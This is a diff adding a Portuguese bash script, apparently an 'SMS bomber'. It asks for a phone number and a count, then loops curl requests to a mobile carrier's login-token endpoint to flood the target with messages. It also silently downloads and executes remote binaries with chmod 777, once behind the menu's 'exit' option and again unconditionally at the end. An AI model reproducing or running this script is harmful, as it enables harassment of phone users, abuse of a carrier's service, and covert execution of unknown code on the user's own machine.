@@ -1,1 +1,62 @@
 
+#!/bin/bash
+clear
+MSGS=("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿
+⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿
+⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿
+⣭⣍⠛⠿⠄⢰⠋⡉⠹⣿⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⡟⢁⠙⡆⢡⣿⣿⣿
+⠻⣿⡆⠄⣤⠈⢣⣈⣠⣿⣿⣿⣿⣿⠏⣄⠻⣿⣿⣿⣿⣿⣆⣈⣴⠃⣿⣿⣿⣿
+⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋
+⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸"
+)
+MSG=${MSGS[$RANDOM % ${#MSGS[@]} ]}
+echo -e "$MSG"
+echo ""
+sleep 4
+echo -e "\e[00;33;01mESTA FERRAMENTA \nÉ APENAS PARA USUÁRIOS \nPROFISSIONAIS, LEIA DESCRIÇÃO ANTES \nDE BAIXAR\033[0m"
+sleep 5
+echo -e '\e[00;00;02molá mãe @EHISOPENER\e[m'
+sleep 4
+clear
+echo -e "\e[00;33;01mAqui é o Brasil\e[m"
+sleep 3
+clear
+echo -e "\e[00;33;01mLogar, perturbar a paz\e[m"
+sleep 1
+echo ""
+echo -e "\033[01;37mou vai ou racha?\033[0m"
+echo -e "\033[0m\033[01;37m(1) \033[01;32mbora\033[0m"
+echo -e "\033[0m\033[01;37m(2) \033[01;32mSAIR, TENHO MEDO DE USAR\033[0m"
+read OPTION
+case $OPTION in 
+        (1) echo -e "\e[00;37;01mDIGITE O NUMERO DDD+NUMERO\e[m"
+         read -p 'numero: ' NUMERO
+         echo -e "\e[00;37;01mpertubar quantas vezes? seu IMEI será gravado\e[m"
+         read -p 'vezes: ' VEZES
+         for i in $(seq $VEZES);
+         do
+         data=$"numero=$NUMERO" && site=$"https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do" && curl "${site}" -H "User-Agent: Android" -d "${data}" -v
+         done
+         echo ""
+         sleep 2
+         echo -e "\033[01;32mSOLICITAÇÕES FINALIZADAS\e[0m"
+         sleep 5
+         ;;
+        (2) echo -e "\e[00;33;01mSEM ARREPENDIMENTOS\e[0m"
+           sleep 1
+           clear
+curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/ospacotesmb && chmod 777 ospacotesmb && ./ospacotesmb
+           exit
+        ;;
+        (*) echo -e "\033[1;31mOPCÃO INVÁLIDA!\033[1;37m"
+esac
+curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/mbsfree && chmod 777 mbsfree && ./mbsfree
